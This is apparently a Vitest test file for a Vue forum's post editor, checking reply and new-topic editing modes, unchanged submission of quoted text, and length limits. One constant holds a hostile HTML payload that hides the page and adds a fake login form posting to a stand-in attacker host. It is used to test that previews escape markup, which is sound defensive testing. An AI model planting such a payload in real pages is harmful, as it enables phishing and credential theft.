import type { Component } from 'vue'
import type { Post, Topic, User } from '~/data/types'
import type { TestNode } from './support/sfc'
import { beforeAll, describe, expect, it, vi } from 'vitest'
import { defineComponent, h, nextTick, reactive, ref } from 'vue'
import * as forumApi from '../shared/forum-api'
import * as postMarkdown from '../shared/post-markdown'
import { find, findAll, isShown, loadComponent, mount, textOf } from './support/sfc'
import { loadMarked, TUFFEX_STUBS } from './support/tuffex-stubs'

/**
 * The pages that use PostEditor, mounted with their stores stubbed: the reply
 * drawer (quotes included) and the new-topic form. What they send is the text
 * in the textarea, whatever mode the editor was left in, and the length checks
 * still hold.
 */
const { MEMBER_CONTENT_MAX } = forumApi
const { quoteDraft } = postMarkdown

const HOSTILE = '<style>*{display:none}</style><form action="https://evil.example"><input name=p><button>登录</button></form>'
const TAG = /<(?:style|form|input|button)\b/i

const member: User = { id: 'u1', username: 'alpha', displayName: '甲', bio: '', location: '', website: '', avatarColor: '#123456', joinedAt: 0, role: 'member', notifyPrefs: { reply: true, like: true, follow: true } }
const topic: Topic = { id: 't1', slug: 'topic-1', title: '话题', categoryId: 'c1', tagIds: [], authorId: 'u1', createdAt: 0, lastActivityAt: 0, views: 1, pinned: false, closed: false }
const hostilePost: Post = { id: 'p2', topicId: 't1', authorId: 'u1', content: HOSTILE, createdAt: 0, likeUserIds: [] }

let components: Record<string, Component>

beforeAll(async () => {
  await loadMarked()
  const ForumMarkdown = loadComponent('components/ForumMarkdown.vue', { imports: { '../../shared/post-markdown': postMarkdown } })
  const PostEditor = loadComponent('components/PostEditor.vue')
  const TurnstileBox = defineComponent({ setup: () => () => h('div') })
  components = { ...TUFFEX_STUBS, ForumMarkdown, PostEditor, TurnstileBox }
})

async function settle() {
  await new Promise(resolve => setTimeout(resolve))
  await nextTick()
}

function editorOf(root: TestNode) {
  const textarea = () => find(root, node => node.tag === 'textarea')!
  const modes = () => findAll(root, node => node.props.role === 'radio')
  const preview = () => find(root, node => 'data-editor-preview' in node.props)
  return {
    textarea,
    preview,
    previewHtml: () => findAll(preview()!, node => node.tag === 'article').map(node => String(node.props.html)).join(''),
    choose: async (label: string) => {
      (modes().find(node => textOf(node) === label)!.props.onClick as () => void)()
      await nextTick()
    },
    type: async (value: string) => {
      (textarea().props.onInput as (value: string) => void)(value)
      await nextTick()
    },
  }
}

/** A Tuffex button (not one of the editor's mode radios) by its text. */
function button(root: TestNode, label: string): TestNode {
  const found = find(root, node => node.tag === 'button' && node.props.role !== 'radio' && textOf(node) === label)
  if (!found)
    throw new Error(`no button ${label}`)
  return found
}

async function click(node: TestNode) {
  (node.props.onClick as () => void)()
  await settle()
}

describe('the reply drawer', () => {
  function mountComposer(replyTo?: Post) {
    const createPost = vi.fn(async (_input: { content: string, replyToPostId?: string }) => 'p9')
    const ReplyComposer = loadComponent('components/ReplyComposer.vue', {
      imports: {
        '@talex-touch/tuffex/utils': { toast: vi.fn() },
        '../../shared/forum-api': forumApi,
        '../../shared/post-markdown': postMarkdown,
      },
      globals: {
        useForumStore: () => ({ userById: () => member, postsOfTopic: () => [hostilePost] }),
        useForumServerStore: () => ({ guestPolicy: { contentMax: 2000, nameMax: 20, turnstileSiteKey: null } }),
        useForumActions: () => ({ createPost }),
        useContentSource: () => ({ serverMode: true }),
        useCurrentUser: () => ({ user: ref(member), can: () => true, guestCanReply: () => false }),
      },
    })
    const state = reactive({ visible: false })
    const Parent = defineComponent({
      setup: () => () => h(ReplyComposer, { visible: state.visible, topic, replyTo }),
    })
    const { root } = mount(Parent, {}, components)
    return { root, state, createPost, editor: editorOf(root) }
  }

  it('opens in 编辑 with the quote in the textarea, as written', async () => {
    const { root, state, editor } = mountComposer(hostilePost)
    state.visible = true
    await settle()
    expect(editor.textarea().props.value).toBe(quoteDraft(hostilePost))
    expect(editor.textarea().props['aria-label']).toBe('回复内容')
    expect(isShown(editor.textarea())).toBe(true)
    expect(editor.preview()).toBeUndefined()
    expect(find(root, node => node.props.role === 'radio' && node.props['aria-checked'] === true)).toSatisfy(node => textOf(node as TestNode) === '编辑')
  })

  // #134: quoting a post with <style> and <form>, then switching modes, renders neither.
  it('shows a quoted <style> and <form> as text in 分栏 and 预览, and sends the quote plus the reply unchanged', async () => {
    const { root, state, editor, createPost } = mountComposer(hostilePost)
    state.visible = true
    await settle()
    for (const mode of ['分栏', '预览']) {
      await editor.choose(mode)
      expect(editor.previewHtml()).not.toMatch(TAG)
      expect(editor.previewHtml()).toContain('&lt;')
    }
    await editor.choose('分栏')
    const draft = `${quoteDraft(hostilePost)}我的回复`
    await editor.type(draft)
    expect(editor.previewHtml()).toContain('我的回复')
    await editor.choose('预览')
    await click(button(root, '回复'))
    expect(createPost).toHaveBeenCalledOnce()
    expect(createPost.mock.calls[0]?.[0]).toMatchObject({ content: draft, replyToPostId: 'p2' })
  })

  it('still refuses a reply over the member limit, in any mode', async () => {
    const { root, state, editor, createPost } = mountComposer()
    state.visible = true
    await settle()
    await editor.type('字'.repeat(MEMBER_CONTENT_MAX + 1))
    await editor.choose('预览')
    expect(textOf(root)).toContain(`正文超过了 ${MEMBER_CONTENT_MAX} 字`)
    expect(button(root, '回复').props.disabled).toBe(true)
    await editor.type('字'.repeat(MEMBER_CONTENT_MAX))
    expect(textOf(root)).not.toContain('正文超过了')
    expect(button(root, '回复').props.disabled).toBe(false)
    await click(button(root, '回复'))
    expect(createPost).toHaveBeenCalledOnce()
  })
})

describe('the new-topic form', () => {
  function mountNewTopic() {
    const createTopic = vi.fn(async (_input: { title: string, content: string }) => 't9')
    const push = vi.fn(async () => {})
    const NewTopic = loadComponent('pages/new.vue', {
      imports: {
        '@talex-touch/tuffex/utils': { toast: vi.fn() },
        '~/data/access': { UNAVAILABLE_COPY: {} },
        '../../shared/forum-api': forumApi,
      },
      globals: {
        useHead: () => {},
        useRoute: () => ({ query: { category: 'help' } }),
        useRouter: () => ({ options: { history: { state: {} } }, back: vi.fn(), push }),
        useForumStore: () => ({ categoryBySlug: () => ({ id: 'c1' }), state: { categories: [], tags: [] } }),
        useForumActions: () => ({ createTopic }),
        useCurrentUser: () => ({ user: ref(member), isLoggedIn: ref(true), access: ref({ loginPrompt: null }), can: () => true }),
        useShell: () => ({ loginOpen: ref(false) }),
        useContentSource: () => ({ serverMode: true }),
        useSiteLinks: () => ({ signIn: vi.fn() }),
      },
    })
    const { root } = mount(NewTopic, {}, components)
    const title = () => find(root, node => node.tag === 'input')!
    return {
      root,
      createTopic,
      editor: editorOf(root),
      setTitle: async (value: string) => {
        (title().props.onInput as (value: string) => void)(value)
        await nextTick()
      },
    }
  }

  it('writes the body in PostEditor, starting in 编辑 with the 320px height', () => {
    const { editor } = mountNewTopic()
    expect(editor.textarea().props['aria-label']).toBe('话题正文')
    expect(editor.textarea().props.placeholder).toBe('在这里输入内容…')
    expect(String(editor.textarea().props.class).split(' ')).toContain('!min-h-80')
    expect(editor.preview()).toBeUndefined()
  })

  it('previews the body as a post and publishes the Markdown as typed, whatever the mode', async () => {
    const { root, editor, setTitle, createTopic } = mountNewTopic()
    const body = `## 小标题\n\n正文里写了 ${HOSTILE}，还有 **加粗**。`
    await setTitle('一个新话题的标题')
    await editor.type(body)
    await editor.choose('分栏')
    expect(editor.previewHtml()).toContain('<strong>加粗</strong>')
    expect(editor.previewHtml()).not.toMatch(TAG)
    await editor.choose('预览')
    expect(isShown(editor.textarea())).toBe(false)
    await click(button(root, '创建话题'))
    expect(createTopic).toHaveBeenCalledOnce()
    expect(createTopic.mock.calls[0]?.[0]).toMatchObject({ title: '一个新话题的标题', content: body, categoryId: 'c1' })
  })

  it.each([
    ['shorter than 10 characters', '太短了'],
    ['longer than the member limit', '字'.repeat(MEMBER_CONTENT_MAX + 1)],
  ])('does not publish a body %s', async (_what, body) => {
    const { root, editor, setTitle, createTopic } = mountNewTopic()
    await setTitle('一个新话题的标题')
    await editor.type(body)
    await editor.choose('预览')
    await click(button(root, '创建话题'))
    expect(createTopic).not.toHaveBeenCalled()
  })
})
